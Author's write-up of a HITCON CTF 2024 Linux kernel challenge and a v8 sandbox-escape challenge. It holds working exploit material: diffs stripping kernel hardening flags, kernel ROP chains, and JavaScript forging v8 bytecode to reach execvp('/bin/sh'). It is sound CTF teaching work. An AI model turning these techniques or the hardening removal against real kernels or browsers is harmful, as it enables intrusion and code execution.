---
layout: post
title:  "HITCON CTF QUAL 2024 Pwn Challenge Part 1 - Halloween and v8sbx"
categories: linux
---

This year, I created a Linux Kernel challenge **"Halloween"** for the HITCON CTF Qualification, and the entire process took me about a month, including designing the challenge, writing the exploit, and setting up the environment. This article serves as the official writeup, providing a detailed explanation of the vulnerability and the exploitation method used in this challenge. Additionally, I also reviewed some other pwn challenges and had a lot of funs. As a result, I will also write down my solution notes for their challenges.

## Halloween - Linux Kernel RCE

### 0. TLDR Version

#### Vulnerabilities

1. Auth Bypass - When the `scarecrow` name is "r", "ro", or "roo", it passes the `TT_REGISTER` check, but can still obtain ADMIN privileges in `TT_AUTH`.
2. Control RIP - When two connections use the same `grip` object, they can race the trick type, which is used as an index for the jump table.
3. Information Leak - `TT_WRITE` updates the iterator before reading data. If the amount of data sent by client does not match the expected size, it exits without restoring the iterator. By crafting fake data formats that pass some checks, it is possible to read data outside `space[]` in `TT_READ`.

#### Exploit

1. Leak the kernel text address from the residual data in the heap. If the leak fails, you can trigger a page fault to reboot.
2. Spraying scarecrows and leaking address from them. The `list` member points to the global variable `scarecrow_head` in the kernel module, and `secret` member holds the heap address which we can control the content.
3. Use `TT_UPDATE_SECRET` to construct ROP chain in the `scarecrow->secret`, referred to here as `payload_addr`.
4. Calculate the index offset between `payload_addr` and the jump table.
5. Establish a new connection, conn-1, with the cookie set to `payload_addr`, and continuously send `TT_PING`.
6. Establish a new connection, conn-2, with the cookie set to `payload_addr`, and obtain the same `grip` object as conn-1.
7. conn-2 continuously sends command which type value is the offset calculated in step 4.
8. When racing successfully, conn-1 will call the `[payload_addr + 0]`, and we can control the `rip` and do ROP.

#### ROP

1. `send_to_socket(sock, flag_addr, 0x10000)` - send flag back to us.
2. `msleep(10000000)` - avoid kernel panic.



### 1. Introduction

To prevent players from using 0-day or 1-day exploits, I wanted to design a challenge that is accessible only remotely. Consequently, I wrote a kernel module running a network service that provides six functions:

- `TT_PING` - Used for testing; the service will return "PONG".
- `TT_REGISTER` - Registers a scarecrow, requiring the user to provide a name, secret, and space size.
- `TT_AUTH` - Logs in and checks if the scarecrow has ADMIN privileges.
- `TT_READ` - Reads data from the space, requiring ADMIN privileges to execute.
- `TT_WRITE` - Writes data to the space, requiring ADMIN privileges to execute.
- `TT_UPDATE_SECRET` - Updates the secret data.

For each new connection, the service allocates a `grip` object to identify different connection states (like session) and stores the `grip` in a grip cache, `grips[]`. Each `grip` has an 8-byte cookie. If a non-zero cookie is provided at the start of the connection, the service attempts to find a `grip` in `grips[]` with the same cookie. If found, the service reuses that `grip` object, allowing multiple connections to use the same `grip`.

Without logging in, the connection can only access the PING-PONG (`TT_PING`) function for testing, as well as the registration (`TT_REGISTER`) and authentication (`TT_AUTH`) functions. The former allows the registration of a new scarecrow (user), while the latter enables the current grip to bind to a scarecrow. At first glance, it seems that only the "root" scarecrow has ADMIN privilege, which can use the read and write functions. However, the registration check prevents us from creating a new "root" scarecrow.

If the read and write functions can be used, the service expects to receive 1 byte indicating the size followed by the data. When the incoming data matches this expected format, the size and data are written into the space of scarecrow (`scarecrow->space[]`). After that, the data iterator will be aligned to 4 bytes. When the client reads the data, the same format is used to parse `scarecrow->space[]` and return the data.

The last function (`TT_UPDATE_SECRET`) allows updating the scarecrow's secret data. It simply reads the data from the socket and copies it to the `scarecrow->secret`.



### 2. The Vulnerabilities

#### 2.1. Auth Bypass

The `register_trick()` function is responsible for handling registration requests. If it finds that the scarecrow name is "root", the request is not allowed to proceed anymore. However, the `strncmp()` function has its length parameter hardcoded to 4 [1], allowing us to register scarecrow names like "r", "ro", or "roo".

```c
static int register_trick(struct socket *sock)
{
    // [...]
    if (!strncmp(data, "root", 4)) { // [1]
        err = -1;
        goto free_data;
    }
    // [...]
}
```

The `auth_trick()` function is responsible for handling authentication requests. When checking if the scarecrow name is "root", it uses the name length as the length parameter [2]. Therefore, scarecrow names like "r", "ro", or "roo" can pass the `strncmp()` check and gain ADMIN privileges.

```c
static int auth_trick(struct socket *sock, struct grip *grip)
{
    // [...]
    if (!strncmp(scarecrow->name, "root", scarecrow->name_len)) // [2]
        grip->state = GS_ADMIN;
    else
        grip->state = GS_GUEST;
    // [...]
}
```



#### 2.2. Race Condition The Jump Table Index

The `handle_trick()` function checks if the trick type is valid before processing the request [1]. If the trick type is invalid, the request is simply ignored. However, two connections are able to share the same grip. If one connection first provides a valid trick type and continues execution, while the other connection writes an invalid trick type, this can cause the switch case [2] to not match any handler, ultimately leading to the default case [3].

```c
static int handle_trick(void *data)
{
    // [...]
    while (true) {
        err = read_from_socket(sock, &grip->trick, sizeof(struct trick), MSG_DONTWAIT);
        if (err == 0) {
            if (grip->trick.magic != TOT_MAGIC || grip->trick.type > TT_UPDATE_SECRET) // [1]
                continue;
            break;
        }
        // [...]
    
        switch (grip->trick.type) { // [2]
        // [...]
        default:
        __builtin_unreachable(); // [3]
        }
    }
    // [...]
}
```

According to the [GCC official documentation](https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html) for the builtin function `__builtin_unreachable()`:

> If control flow reaches the point of the `__builtin_unreachable`, the program is undefined. It is useful in situations where the compiler cannot deduce the unreachability of the code.

`__builtin_unreachable()` is used to inform the compiler that a specific code path will never be executed. However, if that path is executed, it results in **undefined behavior**. When the number of switch cases exceeds a certain threshold (observed to be four), a jump table is used to handle them, and it will use switch value as the index to access the table entry. Therefore, by racing the `grip->trick.type` to change the jump table index, we can make the table entry fall into a arbitrary memory area, thus partially controlling the RIP.

In fact, the default x86 Linux Makefile adds some flags to prevent the compiler from using jump tables, such as `-fno-jump-tables`. As a result, the switch case is implemented using multiple compare instructions, avoiding the situation as mentioned above. To design a CTF challenge, I wanted the kernel module using jump table instead of comparison instructions. Consequently, I modified the compile flags related to jump tables in the Makefile. Below is the diff for Makefile of the kernel and the kernel module.

```diff
--- linux-6.6.32/arch/x86/Makefile
+++ linux-6.6.32_for_compile_ko/arch/x86/Makefile
@@ -13,14 +13,14 @@
 endif

 ifdef CONFIG_CC_IS_GCC
-RETPOLINE_CFLAGS       := $(call cc-option,-mindirect-branch=thunk-extern -mindirect-branch-register)
+#RETPOLINE_CFLAGS      := $(call cc-option,-mindirect-branch=thunk-extern -mindirect-branch-register)
 RETPOLINE_VDSO_CFLAGS  := $(call cc-option,-mindirect-branch=thunk-inline -mindirect-branch-register)
 endif
 ifdef CONFIG_CC_IS_CLANG
 RETPOLINE_CFLAGS       := -mretpoline-external-thunk
 RETPOLINE_VDSO_CFLAGS  := -mretpoline
 endif
-RETPOLINE_CFLAGS       += $(call cc-option,-mindirect-branch-cs-prefix)
+#RETPOLINE_CFLAGS      += $(call cc-option,-mindirect-branch-cs-prefix)

 ifdef CONFIG_RETHUNK
 RETHUNK_CFLAGS         := -mfunction-return=thunk-extern
@@ -80,7 +80,7 @@
 #
 #   https://gcc.gnu.org/bugzilla/show_bug.cgi?id=104816
 #
-KBUILD_CFLAGS += $(call cc-option,-fcf-protection=branch -fno-jump-tables)
+KBUILD_CFLAGS += $(call cc-option,-fcf-protection=branch)
 else
 KBUILD_CFLAGS += $(call cc-option,-fcf-protection=none)
 endif
@@ -200,7 +200,7 @@
   # only been fixed starting from gcc stable version 8.4.0 and
   # onwards, but not for older ones. See gcc bug #86952.
   ifndef CONFIG_CC_IS_CLANG
-    KBUILD_CFLAGS += -fno-jump-tables
+    #KBUILD_CFLAGS += -fno-jump-tables
   endif
 endif
```

The inspiration for this vulnerability comes from a [v8 commit](https://github.com/v8/v8/commit/cba6eed1e34117b0ad40740959ecf5fe445cbf06) related to sandboxing. The commit describes how an OOB access to the jump table can occur when the `RegExp::Exec()` switch case handles an unexpected type value, raising concerns about a potential sandbox escape. But it seems that v8's `UNREACHABLE()` function is not quite the same as `__builtin_unreachable()`, though I'm not sure about the differences.



#### 2.3. Wrongly Handle The Write Request

Error handling has always been a common type of vulnerabilities, as the program must roll back to a previous state when an error occurs. If not handled properly, this can lead to some side effects.

The `write_trick()` function is responsible for handling requests to write data to a space. Initially, it receives a `content_len` and checks whether it exceeds the limit [1]. If the check passes, `content_len` is stored in the space and the `scarecrow->iteractor` is updated [2]. Subsequently, it expects to receive data of size `content_len` [3]. However, if the sent data is smaller than `content_len`, `write_trick()` just return an error and disconnect [4]. The problem arises because `scarecrow->iteractor` is not reverted to its original state, allowing us to control the value of `scarecrow->curr_ptr` and the contents of the space before `scarecrow->curr_ptr`.

```c
static int write_trick(struct socket *sock, struct grip *grip)
{
    // [...]
    if (!wtrick.content_len || wtrick.content_len > scarecrow->space_size) { // [1]
        err = -1;
        goto unlock;
    }
    
    *(char *)&scarecrow->space[scarecrow->curr_ptr] = wtrick.content_len; // [2]
    scarecrow->curr_ptr += 1;

    err = read_from_socket(sock, &scarecrow->space[scarecrow->curr_ptr], wtrick.content_len, 0); // [3]
    if (err != 0) {
        err = -1; // [4]
        goto unlock;
    }
}
```

The `read_trick()` function is responsible for handling data read requests. After receiving the requested `read_length`, the function traverses `scarecrow->space[]` and copies the data to the return buffer. Due to the error handling flaw in `write_trick()`, we can control the data size [5]. If we set the data size to 0, the iterator `space` will keep updating due to alignment [6], which indirectly allows us to control the starting position for reading [7].

```c
static int read_trick(struct socket *sock, struct grip *grip)
{
    // [...]
    space = &scarecrow->space[0];
    iter = curr_size = 0;
    
    while (iter + 1 < scarecrow->curr_ptr) {
        content_len = *(char *)space; // [5]
        if (content_len < 0)
            break;

        if (content_len >= rtrick.read_length - curr_size)
            content_len = rtrick.read_length - curr_size;

        next_iter = iter + 1 + content_len;
        if (next_iter >= scarecrow->curr_ptr)
            break;

        memcpy(base + curr_size, space + 1, content_len); // [7]
        curr_size += content_len;

        if (curr_size == rtrick.read_length)
            break;

        aligned_size = ALIGN(1 + content_len, SPACE_ALIGNMENT);
        iter += aligned_size;
        space += aligned_size; // [6]
    }
    // [...]
}
```

By positioning the `space` at the last 4 bytes of `scarecrow->space[]` and setting the data length to a valid value that passes the checks, it is possible to leak some data from subsequent memory, including sensitive addresses.



#### 2.4. Integer Promotion Special Case

When the compiler handles operations between operands of different sizes (in bytes) and signedness, it first uses the larger operand as the basis. The smaller operand is then expanded to match the size of the larger operand, and its signedness is also converted to match the larger operand. This mechanism is called **Integer Promotion**. For example, in the following code, `(int)0xffffffff` is first expanded to `(long)0xffffffffffffffff` and then the signedness is updated to `(unsigned long)0xffffffffffffffff`.

```c
#include <stdio.h>
int main()
{
    printf("%d\n", (int)0xffffffff > (unsigned long)1);
}
// output: 1
```

If two operands are of the same size but have different signedness, they are both converted to **unsigned** for the comparison. For instance, `(int)0xffffffff` would be converted to `(unsigned int)0xffffffff` before being compared with `(unsigned int)1`.

```c
#include <stdio.h>
int main()
{
    printf("%d\n", (int)0xffffffff > (unsigned int)1);
}
// output: 1
```

What is less well known is that Integer Promotion has a special case: if both operands are smaller than 4 bytes, **they will both be promoted to int**. For instance, in the following code, if we followed the previous example, we might expect the output to be 1, which is `(unsigned short)0xffff > (unsigned short)1`. However, because the special case of Integer Promotion, the comparison should be promoted to `(int)0xffffffff > (int)1`, and the actual output is 0. For more details, you can refer to the Stack Overflow article [Implicit type promotion rules](https://stackoverflow.com/a/46073296).

```c
#include <stdio.h>
int main(void)
{
    printf("%d\n", (char)0xff > (unsigned short)1);
}
// output: 0
```

Back to the challenge, it is important to note that the check for whether the iterator goes out-of-bounds compares a `char` with an `unsigned short` [1] in the `read_trick()`. As a result, if `next_iter` exceeds 0x80, it can still pass the check and continue reading data.

```c
static int read_trick(struct socket *sock, struct grip *grip)
{
	// [...]
    next_iter = iter + 1 + content_len;
    if (next_iter /*char*/ >= scarecrow->curr_ptr /*unsigned short*/) // [1]
        break;
    // [...]
}
```

As in the case of jump tables, the default Linux kernel Makefile uses the compile flag `-funsigned-char` to prevent such situations. This flag forces all `char` to be treated as `unsigned char`. I removed this flag from the Makefile when compiling the kernel module.

```diff
--- linux-6.6.32/Makefile
+++ linux-6.6.32_for_compile_ko/Makefile
@@ -559,7 +559,7 @@
 KBUILD_CFLAGS :=
 KBUILD_CFLAGS += -std=gnu11
 KBUILD_CFLAGS += -fshort-wchar
-KBUILD_CFLAGS += -funsigned-char
+#KBUILD_CFLAGS += -funsigned-char
 KBUILD_CFLAGS += -fno-common
 KBUILD_CFLAGS += -fno-PIE
 KBUILD_CFLAGS += -fno-strict-aliasing
```

This vulnerability was inspired by a blog post by researcher VictorV, which discusses differences in how various compilers handle the signedness of operands during comparisons. You can find the article [here](https://v-v.space/2023/03/24/compiler_error/).

I have also verified this behavior on my VM. The output of the following code on my VM, ARM Ubuntu 23.04, is 1, but it should be 0.

```c
#include <stdio.h>
int main(void)
{
    printf("%d\n", (char)0xff > (unsigned short)1);
}
// output: 1 (in my ARM Ubuntu VM, gcc version 12.3.0 (Ubuntu 12.3.0-1ubuntu1~23.04))
```

Never have I ever understood compiler.



### 3. Exploit

#### 3.1 Informantion Leak

In addition to kernel text, we also need the address of the heap memory address to store the ROP chain, as well as the kernel module to calculate the offset between jump table and payload.

The kernel text can be leaked through other objects in the same slab or the residual data of freed objects. Because the success of the leak depends on the heap layout after booting, it's not quite stable. So if the leak fails, we can use the vulnerability **Race Condition The Jump Table Index** to trigger a page fault. Because the kernel boot parameters include "oops=panic" and "panic=1", the kernel will treat a page fault as a panic event and automatically reboot after one second. This allows us to continuously reset the kernel heap layout until the leak is successful.

```bash
qemu-system-x86_64 \
    -append "nokaslr oops=panic panic=1 console=ttyS0 quiet" \
    [...]
```

The heap and kernel module addresses cannot be leaked using same method, and we need to do some heap spraying. It seems that only `scarecrow` object can be used for spraying because we can create 32 scarecrows at most. Fortunately, the `scarecrow->secret` points to controllable **heap data** [1], and it can be updated by trick `TT_UPDATE_SECRET`. Additionally, if the `scarecrow` object is the first in the linked list, the `scarecrow->list` [2] will point to the `scarecrow_head` located in the **kernel module**, and then we can obtain **jump table** address by subtracting a fixed offset.

```c
struct scarecrow {
    char *name;
    char *secret; // [1]
    unsigned char name_len;
    unsigned char secret_len;
    struct mutex lock;

    struct list_head list; // [2]
    // [...]
};
```



#### 3.2 Control RIP

Here is the assembly code for the `handle_trick()` function's switch case with ASLR disabled. Initially, it retrieves the trick type's value [1], then updates the expired time [2], and finally jumps to execute the address at `[value * 8 - 0x3fffbda8]` [3].

```
// [...]
0xffffffffc00003df <handle_trick+447>:       mov    rax,QWORD PTR [rbx+0x30]      // [1]
0xffffffffc00003e3 <handle_trick+451>:       add    QWORD PTR [rbx+0x8],0x1       // [2]
0xffffffffc00003e8 <handle_trick+456>:       jmp    QWORD PTR [rax*8-0x3fffbda8]  // [3]
// [...]
```

Indeed, `-0x3fffbda8` is actually `0xffffffffc0004258`, which is the address of the jump table.

```
pwndbg> x/10gx -0x3fffbda8
0xffffffffc0004258:     0xffffffffc0000829      0xffffffffc00003ef
0xffffffffc0004268:     0xffffffffc0000780      0xffffffffc0000609
0xffffffffc0004278:     0xffffffffc00004f7      0xffffffffc0000842
```

Exactly, by calculating the offset between the jump table and `scarecrow->secret`, you can control the data fetched by `[rax*8-0x3fffbda8]`.

In the code snippet below, `payload_addr` represents the address of `scarecrow->secret` and `jmp_table` represents the address of the jump table. Subtracting these values and dividing by 8 will yield `idx`, which is the trick type value you need to race to control RIP.

```c
unsigned long idx = (payload_addr - jmp_table) / 8;
```



#### 3.3 Setup ROP

Here are the addresses of some gadgets used during the exploit construction phase:

```
0xffffffff81206879 : mov rax, qword ptr [r12] ; call qword ptr [rax + 0x28]
0xffffffff812d4468 : mov rdi, qword ptr [rax + 0x20] ; mov rax, qword ptr [rdi + 0x18] ; call qword ptr [rax - 0x20]
0xffffffff8118388f : push rdi ; pop rsp ; xor eax, eax ; test edx, edx ; jle 0xffffffff81183898 ; ret
0xffffffff81001bac : pop rdi ; ret
0xffffffff81001970 : pop rsi ; ret
0xffffffff81002ce7 : pop rbx ; ret
0xffffffff810fc69e : pop rdx ; ret
0xffffffff8106930f : pop rcx ; ret
0xffffffff81053110 : pop rax ; ret
0xffffffff810ec2ad : sub rax, rdx ; ret
0xffffffff8102314a : mov rax, rbp ; pop rbp ; ret
0xffffffff817893fb : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0xffffffff8104657b : mov rsi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0xffffffff810664d0 : mov rax, qword ptr [rsi] ; ret
0xffffffff810e42b0 : msleep
```

Our first goal is to pivot the stack to `payload_addr` because it allows us to do more things through ROP. After gaining control of `rip`, we execute the following gadget chain for stack pivoting. The execution order of each gadget is indicated by the annotated numbers.

```c
// r12 is &grip->cookie, and [r12] is payload_addr which we can control
*(unsigned long *)(payload_addr + i) = KASLR(0xffffffff81206879); i += 8; // [1]
*(unsigned long *)(payload_addr + i) = 0;                         i += 8;
*(unsigned long *)(payload_addr + i) = KASLR(0xffffffff8118388f); i += 8; // [3]
*(unsigned long *)(payload_addr + i) = 0;                         i += 8;
*(unsigned long *)(payload_addr + i) = payload_addr + 0x30;       i += 8;
*(unsigned long *)(payload_addr + i) = KASLR(0xffffffff812d4468); i += 8; // [2]
```

Once we've successfully pivoted the stack to `payload_addr`, we can execute arbitrary ROP chain. Given that `/flag` is stored in memory due to the use of ramfs, the next step is to call `send_to_socket(socket, flag_addr, length)`, sending the flag back through the current socket connection.

To execute the `send_to_socket()` function, the first parameter needs to be the `socket` object of the current connection, which is stored in `rbp` when we control the `rip`. Therefore, the ROP chain will move the address of the `socket` object from `rbp` into `rdi`.

```c
// rbp is the address of socket object
*(unsigned long *)(payload + i) = KASLR(0xffffffff8102314a); i += 8;
*(unsigned long *)(payload + i) = 0;                         i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff81002ce7); i += 8;
*(unsigned long *)(payload + i) = payload_addr + 0x30;       i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff8106930f); i += 8;
*(unsigned long *)(payload + i) = 0;                         i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff817893fb); i += 8;
```

Next, we obtain the address near the flag from the global variable `static_command_line`. By subtracting a fixed offset, we can calculate the memory range that contains the flag's content.

```c
*(unsigned long *)(payload + i) = KASLR(0xffffffff81001970);  i += 8;
*(unsigned long *)(payload + i) = KASLR(static_command_line); i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff810664d0);  i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff810fc69e);  i += 8;
*(unsigned long *)(payload + i) = flag_offset;                i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff810ec2ad);  i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff8104657b);  i += 8;
```

Finally, set the data size to `0x10000` and call `send_to_socket()` to send the flag back.

```c
*(unsigned long *)(payload + i) = KASLR(0xffffffff810fc69e); i += 8;
*(unsigned long *)(payload + i) = 0x10000;                   i += 8;
*(unsigned long *)(payload + i) = send_to_socket;            i += 8;
```

To avoid any side effects from a kernel panic, I decide to execute `msleep(10000000)` after sending data, ensuring that the corrupted kernel thread does not continue executing.

```c
*(unsigned long *)(payload + i) = KASLR(0xffffffff81001bac); i += 8;
*(unsigned long *)(payload + i) = 10000000;                  i += 8;
*(unsigned long *)(payload + i) = KASLR(0xffffffff810e42b0); i += 8;
```

Once the race condition succeeds, the client's socket will receive an unusually large amount of data, which includes the flag.

```
pk@pk:~/2024_hitcon_chal/linux-6.6.32$ cat /tmp/output | grep --text -i hitcon
hitcon{H4PPY_h4lloW33n_edf8377563f7fa2897df6aa434ad305e}
```

### 4. Unintended Solution

There are some different approaches to pwn it. Team Blue Watter directly called kernel function `call_usermodehelper()` to unload the kernel module and reclaimed the original port to run a shell service. By connecting to the server afterward, they were able to get a shell and obtain the flag. Gaining control over the entire machine is more practical and valuable in real-world scenarios instead of just sending flag, so I think it's a better solution.


## v8sbx - v8 Sandbox Escape

### 1. Introduction

According to the patch file, two new `Sandbox` APIs have been introduced:

- `Sandbox.H32BinaryAddress` - Returns the high 32-bit of the binary base address.
- `Sandbox.modifyTrustedPointerTable` - Modifies an entry in the Trusted Pointer Table.

Since v8 needs to execute user-provided JS code, it is considered a vulnerable component within the browser. Besides using OS-level sandboxes, such as Linux seccomp or Windows Integrity, v8 has recently introduced its own sandbox mechanism.

When the v8 Sandbox is enabled, objects that can simply control the execution flow, such as Blink objects, code objects (like JIT code), and code data objects (like bytecode), are allocated in memory regions outside the v8 Sandbox memory. Additionally, when these objects are created, a corresponding entry is added to a table to record the object's address. v8 Sandbox objects must use entry indices to indirectly access these objects, preventing attackers from directly modifying them to gain arbitrary code execution, even if they obtain arbitrary read/write access within the v8 Sandbox. For more details on the implementation and goals of the v8 Sandbox, please refer to Samuel Groß's presentation at OffensiveCon 2024: [The V8 Heap Sandbox](https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf).

### 2. Exploit

The **Trusted Pointer Table** is a part of the v8 Sandbox that records the addresses of bytecode objects (and other objects). If an attacker can modify this table, they could construct a fake bytecode object within the sandbox and point the table entry to this fake bytecode object, allowing them to execute arbitrary bytecodes. To construct a fake bytecode object, I first created a float array [1] and selected an address within its range, `target_addr` [2]. Then, I modify the table entry of the function `foo()` to point to `target_addr` [3]. This ensures that subsequent calls to `foo()` will run the previously constructed bytecode object.

```javascript
let arr = [];
for (var i = 0; i < 1000; i++) {
    arr.push(parseFloat("1.1")); // [1]
}
let target_addr = Sandbox.getAddressOf(arr) + 0x70; // [2]

// create fake bytecode object at target_addr
// [...]

function foo(addr, val) {
    addr[0] = val;
}
foo([], []);

index = 0x2002;
handle = index << 9;
Sandbox.modifyTrustedPointerTable(handle, 0, sbx_base + target_addr + 1); // [3]
```

Once arbitrary bytecode execution is achieved, I use the bytecode `Ldar a15` to read the return address and obtaine the lower 32-bit of the binary base address.

```javascript
// 0b 12             Ldar a15
// ...
// 0b 05             Ldar a2
// 0b 04             Ldar a1
// 0b 03             Ldar a0
// 0b 02             Ldar <this>
// 0b 01             Ldar <accumulator>, in Trusted Space
// 0b 00             Ldar a-3
memory.setBigInt64(target_addr + 0x28, 0x00f8033704af120bn, true);

var leak = BigInt(foo() << 1);
if (leak < 0)
    leak += 0x100000000n;
var text_base = leak + BigInt(bin_high32) - 0x23bb95cn;
log_addr("text_base", text_base);
```

Next, I use `Ldar a0` to read first parameter into the accumulator register and use `Star a-3` to overwrite the old `rbp`, pivoting stack to the v8 Sandbox. This allows me to execute ROP chain when `foo()` is called again. Directly hijacking execution flow by `rip` seems to not be possible because the parameters of function only accept the addresses of v8 Sandbox objects or 32-bit SMI (Small Integer) values.

```javascript
// 18 03             Star a0
// ...
// 18 01             Star <accumulator>
// 18 00             Star a-3

/*
## control stack
0b 03             Ldar a0
18 00             Star a-3

## control rip
0b 04             Ldar a1
18 01             Star <accumulator>
*/

memory.setBigInt64(target_addr + 0x28, 0xaf0018030bn, true);
foo(fake_stack);
```

Before executing ROP, there are some some checks needed to bypassed. However, since the entire v8 Sandbox can be controlled, this is not an issue for us. Finally, I construct a ROP chain to execute `execvp("/bin/sh", NULL)` and get the shell.

```javascript
memory.setBigInt64(target_addr + 0x108 + 1, rop_ret, true);
memory.setBigInt64(target_addr + 0x200, 0x0068732f6e69622fn, true);
memory.setBigInt64(target_addr + 0x140 + 1, rop_pop_rdi_ret, true);
memory.setBigInt64(target_addr + 0x148 + 1, BigInt(sbx_base + target_addr + 0x200), true);
memory.setBigInt64(target_addr + 0x150 + 1, rop_pop_rsi_ret, true);
memory.setBigInt64(target_addr + 0x158 + 1, 0n, true);
memory.setBigInt64(target_addr + 0x160 + 1, plt_execvp, true);
```



